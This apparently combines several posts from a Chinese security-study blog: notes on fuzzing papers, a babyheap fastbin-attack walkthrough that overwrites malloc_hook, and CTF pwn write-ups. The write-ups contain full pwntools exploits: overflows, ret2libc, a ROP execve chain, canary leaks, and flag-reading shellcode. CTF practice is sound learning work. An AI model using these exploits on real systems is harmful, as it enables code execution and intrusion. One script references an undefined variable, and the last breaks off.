背景：有向灰盒模糊是一种流行的具有针对性的软件测试技术，当给定程序中的一组目标站点，定向灰盒模糊器自动搜索程序的输入空间，以寻找到达目标的输入。但由于现实世界程序的输入空间非常大，大多数现有的有向灰盒模糊器使用进化算法，将其搜索集中在通过工具化程序执行使用反馈信息确定的有希望的输入区域。（比如模糊器经常收集关于控制流图距离或与目标的分支约束距离的反馈信息，并优先处理接近目标的变异输入）\n问题：现有的有向模糊器没有提供任何关于其性能的理论分析。没有严格的理论理解，就很难理解模糊器设计的关键指导原则。（作者提出了几个示例问题：什么是最好的（即最优的）定向模糊器？模糊算法随着输入空间大小的变化而变化的程度如何？什么样的反馈信息对模糊处理最有用？一个算法如何才能最好地利用反馈？在使用这种反馈信息方面，能否比进化算法做得更好？）\n工作：\n复杂理论框架：将关于仪器和模糊算法类型的具体细节抽象到一个统一的框架中。我们将有向灰盒模糊处理的任务建模为一个甲骨文引导的搜索问题：找到到达目标的输入，给定查询访问执行程序的甲骨文，并向模糊处理算法揭示一些关于搜索空间的信息（即有希望的输入区域的身份）。 执行的复杂性：引入了执行复杂度的概念，这是一个渐近度量框架中任何模糊算法的性能的指标。其值是根据模糊器在找到到达目标站点的输入之前进行的oracle查询的数量。 一个最佳的模糊算法：引入了一种特殊类型的甲骨文，称为噪声计数甲骨文。基于噪声计数甲骨文和分析框架设计了一个模糊算法 用蒙特卡洛进行近似计数：我们开发了一种蒙特卡洛算法，用于实现我们的随机定向灰盒模糊算法，但是作者指出这样容易把到达目标数估计成零，因为在实践中，大多数模糊目标点只能由满足一个或多个分支约束的少量输入到达。所以为了克服这个问题，作者认为即使没有找到达到目标的少数输入，我们仍然可以以高置信度计算出一个计数的上界。（不太懂） 浓度范围。可以使用浓度界来推导满足分支约束的可能性的上界 沿着多个分支进行计数。对于任何给定的到达目标的路径，我们近似地计算满足上述路径中每个分支的输入数量，并将它们结合起来，得到到达目标的输入数量的估计值。 讲实话，读完引言感觉这篇有点抽象啊。\nmethodology 本节作者提出一个通用复杂理论框架用于在oracle引导搜索问题中推论最好的定向灰盒模糊器。 然后用这个框架搞一个噪声计数oracle，用这个oracle建立一个优化的定向灰盒模糊器。 2.1 terminology and notation 目标程序为P 在模糊处理过程中要探索的大而有限的输入空间表示为I input region：是输入空间I的子集。 pai：表示CFG中的一条有穷路径 P(i)：输入为i的程序P的执行结果 2.2 A framework for directed greybox fuzzing 在这一节中，我们引入了一个复杂性理论框架来推理最佳模糊器在目标程序执行数量方面的性能下限\nfuzzing as oracle-guided search 该框架允许模糊器通过查询一个甲骨文来学习关于任何有界输入区域I的信息。 假设每个Oracle查询最多可以提供一个给定输入区域的c个比特的信息 该框架不做假设，没有任何关于程序的先验知识 problem definition 将有向灰盒模糊器处理的任务定义为一个Oracle引导的搜索问题：在给定访问程序，控制流图，输入空间，目标边和Oracle询问，模糊算法必须能找到一个输入能够让该输入对应的路径达到目标边。 execution complexity 这个是为了衡量模糊器的性能，定义的一个指标值。在找到达到目标的输入之前需要的甲骨文查询数量。（甲骨文查询的数量直接映射到程序的执行数量，这句话是不是可以理解未查询数就是程序的执行数）\n这里也指出了本文框架的目的，计算测试fuzzer的execution complexity，试图找到execution complexity的下界（最小值），即f找到达到目标的输入之前需要的最小甲骨文查询数量，用这个指标衡量fuzzer性能。\n这一小节给出了模糊算法的下限定理（定理2.1）：给定在每次查询中只揭示一个恒定的c比特信息的任意Oracle，任何模糊算法都需要Ω(log(N))的执行复杂度来寻找在N大小的输入空间中达到目标的输入。\nGreybox vs Blackbox Oracle 作者强调，这个下限是无法用黑盒甲骨文实现的，因为在黑盒甲骨文中无法提供c比特的反馈。\n2.3 使用噪声技术的oracle的最佳定向fuzz 噪声计数oracle：选择两个任意的input region，近似地计算可以到达targets并且属于这两个region的inputs的个数，返回c=1比特的信息。给出了计数oracle的公式，大概就是比较两个input region的数量大小，返回1或0。 $$ O ( I _ { L } , I _ { R } ) = \\left{ \\begin{matrix} { 1 } \u0026amp; { \\mathrm { i f ~ } C ( I _ { L } ) \\geq C ( I _ { R } ) } \\ { 0 } \u0026amp; { \\mathrm { o t h e r w i s e } } \\ \\end{matrix} \\right. $$\n这里提到了一个错误概率p，作者假设噪声甲骨文以p\u0026lt;1/2的概率返回错误的答案。 最佳确定性模糊器：迭代地将一个输入区域分成两半，并查询计数甲骨文以挑选计数较高的那一半，最终找到达到目标的输入。\n这个算法的前提是错误概率为0，也就是没有噪声（noiseless） 最佳的随机化模糊器：指出上面的算法不够实际（p不可能为0），提出了一种新的随机模糊算法\n作者指出：随机算法的期望值考虑了所有的潜在行为，没有对输入分布进行假设，使得适用于任何程序；具有一定成功概率的随机模糊算法都可以被多次重新运行，因此其失败的概率随着试验的增加而呈指数级下降，达到一个可以忽略不计的小值。 算法的执行复杂度（定理2.2）：给定一个噪声计数Oracle，该Oracle返回1bit信息并且查询失败概率p小于1/2，随机模糊算法有O((1−𝛿)∗ log(N)/(1/2−p)^2)的预期执行复杂度，以找到成功概率至少为1−𝛿的可以到达target的输入。 算法的最优性（定理2.3）：给定任何每次查询返回一个常数c比特的信息，失败概率p\u0026lt;1/2的Oracle，任何以至少1−𝛿的概率成功的模糊算法都有Ω((1−𝛿)∗ log(N) ( 1 2−p)2)的预期执行复杂性。 作者指出该算法通过自适应地选择基于每个甲骨文查询的分割点来降低预期的执行复杂度，因此总共有较少的查询。 算法概述 ：从相信任何输入区域都同样可能包含到达目标的输入开始，我们的模糊算法根据每个甲骨文查询迭代地增加有希望区域的权重，并优先考虑在这些有希望的输入区域内的点上进行分割 2.3 通过蒙特卡洛计数的噪声计数Oracle 因为input region的大小往往远远大于可以达到target的输入的个数，所以直接应用蒙特卡洛近似的话，很多input region的达到target计数会近似为0，这样会导致模糊器更难识别哪个input region更有可能含有可以到达target的inputs 利用CFG结构进行计数 疑问 二进制搜索（binary search）是个啥玩意儿，翻翻参考文献\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/%F0%9D%91%80%F0%9D%90%B62-rigorous-and-efficient-directed-greybox-fuzzing/","summary":"MC2 : 严格而高效的定向灰盒模糊法 abstract 背景：most existing directed greybox fuzzers do not provied any theoretical analysis of their performence or optimality.大多数现有的有向灰盒模糊器都没有对其性能或最","title":"𝑀𝐶2 Rigorous and Efficient Directed Greybox Fuzzing"},{"content":"(68条消息) [pwn]堆：fastbin attack 详解_breezeO_o 的博客-CSDN 博客 (68条消息) [BUUCTF]PWN——babyheap_0ctf_2017_Angel~Yan 的博客-CSDN 博客 【学习分享】babyheap_0ctf_2017，一道入门堆的题 这个视频非常详细，非常好\n（主要是对上面两个 writeup 的补充和思路的整理） 这道题主要分为两个步骤\n泄露 libc 地址 修改 malloc_hook 为 onegadget 为什么我们需要泄露 libc 地址呢，因为我们需要知道 malloc_hook 的地址。而 malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过将 mall_hook 指向一个 onegadget 来 getshell。\n泄露 libc 首先我们申请四个 chunk，编号 0、1、2、3。（实际大小应该还加上 presize 的 8 个字节）\n1 2 3 4 alloc(0x18) #0 alloc(0x68) #1 alloc(0x68) #2 alloc(0x18) #3 然后，我们通过溢出 0 号 chunk 来修改 1 号 chunk 的大小（因为 1 号 chunk 的指针指不到自己的 size 的位置），将其修改为 chunk 1+chunk2 的大小。 然后 free (1)，因为此时 1 号 chunk 的大小是 0xe0，所以会放到 unsortbin 链表。 我们为啥要让 1 和 2 chunk 作为一个 chunk 释放呢。因为 unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址 (unsorted bin 链表的头部），这个地址为 main_arena + 0 x 58 ，而且 main_arena 又相对 libc 固定偏移 0 x3c4b20 ，所以得到这个 fd 的值，然后减去 0 x 58 再减去 main_arena 相对于 libc 的固定偏移，即得到 libc 的基地址。 所以我们要想方设法得到这个 fd 的值，但是我们对 chunk 释放后，指针也就失效了，读不到此时挂在 unsortbin 链表上 chunk 的内容。 所以我们让 chunk 1 和 2 堆叠释放，此时 unsortbin 链表上挂了一个大小为 0xe0 的 chunk，然后我们 alloc (0x68)，此时系统会将0xe0 的 chunk 分割，将0x68 分配，而剩下的0x68 大小的 chunk 就是我们之前 alloc 的 chunk 2，此时我们将 chunk 2 打印便可以得到 fd，也就得到 libc 的基址。\n修改 malloc_hook 为 onegadget 大体思路是我们修改挂在 fastbin 链上的空闲 chunk 的 fb，让它指向 malloc_hook 所在的地址区域，让它以为自己后面还挂着一个空闲 chunk。我们将这个伪造的 fake chunk 申请到，我们就可以对其进行编辑了，也就是说可以对 malloc_hook 所在的地址区域进行编辑，那么就把 malloc_hook 的地方写入 onegadget。大功告成。 这里有个小细节，我们伪造的 fake chunk 的大小要符合 fastbin 链表的大小要求，所以在 malloc_hook 所在的地址区域要找一个值满足 fastbin 大小的地址才可以。\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/overlapping-heap%E4%BB%A50ctf-babyheap%E4%B8%BA%E4%BE%8B/","summary":"(68条消息) [pwn]堆：fastbin attack 详解_breezeO_o 的博客-CSDN 博客 (68条消息) [BUUCTF]PWN——babyhe","title":"overlapping heap（以0ctf babyheap为例）"},{"content":"Poste：机器人车辆传感器欺骗攻击的自动发现\n摘要 在本文中，我们提出了一个新的传感器模糊框架SensorFuzz，它可以系统地发现机器人车辆上潜在的传感器欺骗攻击。它通过正式模拟现有的传感器攻击和利用高保真车辆模拟来产生恶意的传感器输入，然后用基于弹性的反馈机制分析输入对车辆的影响。\nintroduction 研究背景:\n现在有很多针对RV（robotic vehicles）的攻击； 发现RV的未知攻击并进行防御具有挑战性，因为 传感器输入值具有巨大和动态的范围 实验昂贵耗时 研究内容：\n开发了一个反馈驱动的模糊器SensorFuzz 生成真实的传感器欺骗输入 基于一个高保真的环内软件模拟器 通过突变模型来减少误报 监控系统内部状态，测量RV对攻击的弹性，弹性评分作为反馈。 MOTIVATION AND CHALLENGES Large input space：输入空间极其巨大，但是大量的输入其实在现实生活中不会出现，所以利用传感器和相关攻击的语义引导的模糊分析将促进攻击发现的过程。\nFuzzing feedback：fuzz测试的feedback选择什么指标是个挑战。\nDESIGN 首先，在模拟器中，我们对产生模拟器输入的函数进行检测，以检索原始的传感器值，并注入由SensorFuzz变异的传感器值。第二，由控制系统产生的控制状态日志被用来实时计算RV对变异值的弹性。然后，弹性被用作反馈，以帮助生成下一个输入。第三，GCS的任务状态被用来检测任务失败。\n传感器输入变异 利用现有传感器攻击公式（这个公式就是关于振幅，频率，相位的公式，因为传感器输入的值就是这些），开发了突变模型（其实也是个关于振幅频率相位的公式）。\n基于弹性的反馈机制 给出了弹性分数的计算公式和突变模型的选择策略。\n我的评价 这篇论文只是把fuzz的思想移植到RV的漏洞检测上，可能这块做的人比较少。创新点在于传感器输入变异公式和弹性衡量公式，但是还是处在一个建模的阶段，不算很难。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/poster-automated-discovery-of-sensor-spoofing-attacks-on-robotic-vehicles/","summary":"Poste：机器人车辆传感器欺骗攻击的自动发现 摘要 在本文中，我们提出了一个新的传感器模糊框架SensorFuzz，它可以系统地发现机器人车辆","title":"Poster Automated Discovery of Sensor Spoofing Attacks on Robotic Vehicles"},{"content":"文译名：profuzzer：实时输入类型探测，以更好地发现零日漏洞 作者：游伟 单位：普顿大学 国家： #美国 年份： #2019年 来源： #SP 关键字： #fuzzing 代码地址： 笔记建立时间： 2023-04-26 09:31\nabstract 实时的探测技术。可以自动的发现和理解关键 fields，并且自动调节变异策略 用单个字节变异，然后自动分析其 fuzz 结果，将相关字节连接在一起，并识别连接后的字段类型，依据该类型的变异策略来进一步变异。 introduction changes most of input based grammar mutation lead to the same execution path and therefore only one of the should be tested futhermore, maybe inputs that exploit vulnerabilities not follow the grammar random mutation has large input space fuzzing the type probing propose a novel technology called profuzzer which has two stages:\nfirst stage: it conducts sequential probing——enumerating every values of every bytes, each time changes on byte. And it also collection information about the target\u0026rsquo;s execution paths under different byte values. These information will used to be analyzed to recover data fields and field type. second stage: utilize these imformation to mutate each field to exploit the values that could lead to an attack or explore legitimate values for better coverage. Overview probing engine generate type templates Iterates all possible value of byte of input, Collects the corresponding execution profiles. Extracts metrics as the features of bytes Groups the consecutive bytes with similar features into a field Determines the type of each field based on the relations between the changes of its possible values and the corresponding variation of observed features Mutation engine guid mutations based on the probed templates a. increase code coverage b. the filed informatin can be used to guide exploit generation Execution Engine and Report Engine based on the AFL DESIGN AND IMPLEMENTATION fuzzing related input field types Assertion\nonly have one correct value Raw Data\ndon\u0026rsquo;t affect the execution of a program Enumeration\nhas a set of valid values Loop Count\ndetermines the times of snippet is executed it has substantial impact on path counts and negligible impact on the paths themselves Offset\ndetermines the data location it may impact on the execution paths Size\ndetermines the amount of data the program should read from the input file it may impact on the execution paths if a byte of input does not fall into the above categories, then used the random mutation strategy\nType Probing probing method has been mentioned many time above and will not repeat again it\u0026rsquo;s worth noting that the way of storing profile (probing result) is edge vector, a campact hash arry edge vector keeps the execution frequencies of individual control-flow edges defintions author defined two metrics based on edge vectors before execute and after execute\ncoverage similarity: the size of the edge coverage intersection of the two vectors, dived by the size of their union frequency difference: the radio between the number of edges with different frequencies and the number of edges that different coverage 注意公式中出现的两种 edge vector 是 i 位置修改前后的两个 edge vector step 1 feature extraction STEP II: Field Identification author considers that invalid values always lead to the same termination path with an exception, which is the shortest path, as a result these invalid values must lead to the same coverage and frequency metrics (个人认为除了值相同，值的下标也应该相同吧)\nSTEP III: Field Type Identification Assertion Fields there exists one and only one value v for the byte that induces a similarity score 1 the similarity score of any other value, is less than the midrange value Raw Data Fields raw data fields values do not affect the control flow of program Enumeration Fields Loop Count Fields Offset Fields Reprobing probing is not the fuzz, it not mutate the input. It just change the byte of input sequentially and change one byte each time. After probing, we get the field ande field type of the input to the testing program. Then we need to mutate it, but based the seed we may get crash and may get better coverage, if the input get better coverage than before, we set this input as new seed and reprobing it\nType Guided Mutation two step:\nexploration mutation:\nlimit the mutation to the legitimate values of the field type to achieve better coverage. do not allow any mutation on raw data fields exploitation mutation\nexploit a set of special values (for the specific field type) that could lead to potential attacks. 在引言部分，作者提出一个很好的观点，就是一个全面的、特定于应用程序的、语义丰富的输入规范对于模糊测试来说是不必要的。更有用的信息是识别对模糊测试至关重要的特殊类型的字段。\n目的： 方法： 意义： 效果：\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/profuzzer-on-the-fly-input-type-probing-for-better-zero-day-vulnerability-discovery/","summary":"文译名：profuzzer：实时输入类型探测，以更好地发现零日漏洞 作者：游伟 单位：普顿大学 国家： #美国 年份： #2019年 来源： #SP 关键字： #fuzzing 代","title":"ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery"},{"content":"![[刷题#2023.2.9 JarvisOJ fm]]\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/pwn%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","summary":"![[刷题#2023.2.9 JarvisOJ fm]]","title":"PWN格式化字符串漏洞"},{"content":"picoctf_2018_buffer overflow 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/PicoCTF_2018_buffer_overflow_2\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 28842) # elf win = elf.symbols[\u0026#39;win\u0026#39;] main_addr = elf.symbols[\u0026#39;main\u0026#39;] a1 = 0x0DEADBEEF a2 = 0x0DEADC0DE print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x6c + p32(0) + p32(win) + p32(main_addr) + p32(a1) + p32(a2) p.sendline(payload) p.interactive() 2023.6.4 jarvisoj_test_your_memory 这个题注意要最后返回到main函数，使得程序正常结束，不然程序崩溃不会回显flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from pwn import * from LibcSearcher import* # context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;./bin/memory\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 29968) # elf system = elf.symbols[\u0026#39;system\u0026#39;] catflag = 0x080487E0 main_addr = elf.symbols[\u0026#39;main\u0026#39;] payload = b\u0026#39;a\u0026#39; * 0x13 + p32(0) + p32(system) + p32(main_addr) + p32(catflag) p.sendline(payload) p.interactive() 2023年5月15日 inndy_rop 这个题是静态编译，怎么看出来的呢，就是特别ida看起来特复杂，就是静态编译的结果。静态编译就不会调用libc中的东西，所以我们也不存在泄露版本利用libc的函数了。 所以使用ROPgadget的一个功能，直接利用程序中的片段拼凑rop链。 ROPgadget --binary rop --ropchain\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from pwn import * r = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 25107) p = b\u0026#39;a\u0026#39;*(0xc+4) p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b8016) p += b\u0026#39;/bin\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea064) # @ .data + 4 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080b8016) # pop eax ; ret p += b\u0026#39;//sh\u0026#39; p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080492d3) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080481c9) # pop ebx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea060) # @ .data p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080de769) # pop ecx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806ecda) # pop edx ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080ea068) # @ .data + 8 p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080492d3) # xor eax, eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0807a66f) # inc eax ; ret p += pack(\u0026#39;\u0026lt;I\u0026#39;, 0x0806c943) # int 0x80 r.sendline(payload) r.interactive() mrctf2020_shellcode 这个题的点是注意环境的配置 context(arch = 'amd64', os = 'linux', log_level = 'debug')\npwnable_orw 这个题有点意思 在 orw_seccomp 函数中有个 prctl 函数，这个函数是内核中的一种安全机制，他可以限制程序使用的系统调用，意思是我们不能劫持程序流去执行 execve 程序调用了。 (1). PR_SET_SECCOMP (22)：当第一个参数是 PR_SET_SECCOMP, 第二个参数 argv2为1的时候，表示允许的系统调用有 read，write，exit 和 sigereturn；当 argv 等于2的时候，表示允许的系统调用由 argv3指向 sock_fprog 结构体定义，该结构体成员指向的 sock_filter 可以定义过滤任意系统调用和系统调用参数。 (2). PR_SET_NO_NEWPRIVS (38): prctl (38,1,0,0,0)表示禁用系统调用 execve ()函数，同时，这个选项可以通过 fork ()函数和 clone ()函数继承给子进程。 我们可以看到这两句程序表示限制了 execve 系统调用，只留给 v1 指向的系统调用，sys_open，sys_read，sys_write。 结合主函数直接执行了我们的输入，所以我们构造打开 flag、读 flag 和写 flag 的三段 shellcode 然后直接输入就可以得到 flag 了。 可以直接通过 shellcraft 构建对应的 shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 25953) # context.log_level = \u0026#39;debug\u0026#39; shellcode = shellcraft.open(\u0026#39;/flag\u0026#39;) shellcode += shellcraft.read(\u0026#39;eax\u0026#39;,\u0026#39;esp\u0026#39;,100) shellcode += shellcraft.write(1,\u0026#39;esp\u0026#39;,100) shellcode = asm(shellcode) p.sendline(shellcode) print(p.recvline()) # p.interactive() 三个系统调用的汇编代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 char*file=\u0026#39;flag\u0026#39;; sys_open(file,0,0); xor ecx,ecx; mov eax,0x5; # eax = sys_open push ecx; # 字符串结尾\u0026#34;\\00\u0026#34; push 0x67616c66; # \u0026#34;flag字符串的16进制表示，由于小端序，所以是从右往左\u0026#34; mov ebx,esp; # ebx = const char __user *filename xor edx,edx; # edx = int mode 设定权限的 int 0x80; sys_read(3,file,0x30); mov eax,0x3; # eax = sys_read mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--\u0026gt;也就是读“flag” mov ebx,0x3; # ebx = unsigned int fd = 3 文件描述符 mov dl,0x30; # edx = size_t count 对应字节数 int 0x80; sys_write(1,file,0x30); mov eax,0x4; # eax = sys_write mov bl,0x1; # ebx = unsigned int fd = 1 mov edx,0x30 # edx = size_t count int 0x80; bjdctf_2020_babyrop2 这个题有 carry，通过格式化字符串漏洞泄露 carry，carry 的位置一般在 ebp 的上面 然后按照 ret2libc 进行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from pwn import * from LibcSearcher import * # context.log_level = \u0026#39;debug\u0026#39; elf = ELF(\u0026#39;bjdctf_2020_babyrop2\u0026#39;) libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27525) # elf puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] vuln = elf.symbols[\u0026#39;vuln\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] #gadgets rdi = 0x0000000000400993 rsi_r15 = 0x4006b1 #get carry print(p.recvline()) print(p.recvline()) print(p.recvline()) payload = b\u0026#39;%7$p\u0026#39; p.sendline(payload) p.recvuntil(\u0026#34;0x\u0026#34;) canary = int(p.recv(16),16) print(hex(canary)) #leak libcbase print(p.recvline()) print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln) p.sendline(payload) puts_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) # cal addr libc_base = puts_addr - libc.symbols[\u0026#34;puts\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base = read_addr - libc.dump(\u0026#34;read\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack print(p.recvline()) print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x18 + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(rdi) + p64(str_bin_sh) + p64(system_addr) p.sendline(payload) p.interactive() bjdctf_2020_router 这个题有意思，记录一下 关键是 Linux 下指令可以用分号拼接 jarvisoj_level4 简单的 ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import* elf = ELF(\u0026#39;level4\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.23-ubuntu16-32.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27350) # elf write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] vuln = elf.symbols[\u0026#39;vulnerable_function\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] #gadgets # rdi = 0x4006b3 # rsi_r15 = 0x4006b1 #leak libcbase payload = b\u0026#39;a\u0026#39; * 0x8c + p32(write_plt) + p32(vuln) + p32(1) + p32(write_got) + p32(4) p.sendline(payload) write_addr = u32(p.recv(4)) print(hex(write_addr)) # cal addr libc_base = write_addr - libc.symbols[\u0026#34;write\u0026#34;] system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() # libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base = read_addr - libc.dump(\u0026#34;read\u0026#34;) # system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack payload = b\u0026#39;a\u0026#39; * 0x8c + p32(system_addr) + p32(0) + p32(str_bin_sh) p.sendline(payload) p.interactive() jarvisoj_level3_x64 这个题真的坑爹 首先是用本地的 libc 没解出来，然后用 libcsearch 也没解出来 然后 read 换成 write 才成功 已经遇到两次 read 的 libc 地址解不出来了，以后不用 read 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 from pwn import * from LibcSearcher import* elf = ELF(\u0026#39;level3_x64\u0026#39;) libc = ELF(\u0026#39;./libc/libc-2.23-ubuntu16-64.so\u0026#39;) p = remote(\u0026#39;node4.buuoj.cn\u0026#39;, 27049) # elf write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] vuln = elf.symbols[\u0026#39;vulnerable_function\u0026#39;] #gadgets rdi = 0x4006b3 rsi_r15 = 0x4006b1 #因为read函数已经将rdx设置为0x200足够我们用了 #leak libcbase print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x88 + p64(rdi) + p64(1) + p64(rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(vuln) p.sendline(payload) write_addr = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(write_addr)) #cal addr # libc_base = read_addr - libc.symbols[\u0026#34;read\u0026#34;] # system_addr = libc_base + libc.symbols[\u0026#34;system\u0026#34;] # str_bin_sh = libc_base + libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() libc = LibcSearcher(\u0026#39;write\u0026#39;, write_addr) libc_base = write_addr - libc.dump(\u0026#34;write\u0026#34;) system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) str_bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) #attack # print(p.recvline()) payload = b\u0026#39;a\u0026#39; * 0x88 + p64(0x400648) + p64(rdi) + p64(str_bin_sh) + p64(system_addr) + p64(vuln) p.sendafter(\u0026#39;Input:\\n\u0026#39;, payload) p.interactive() ez_pz_hackover_2016 写惯了 ret2libc 都忘记怎么 ret2text 了\n把 shellcode 写入栈，然后将返回地址覆盖为 shellcode 这个题我有点想当然了，一开始将 shellcode 写入那个 s 的位置，没考虑长度够不够 而且这个题 ida 分析到的偏移不对，实际要动态去调 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 27493) shellcode = asm(shellcraft.sh()) print(p.recvline()) print(p.recvline()) print(p.recvline()) print(p.recvline()) 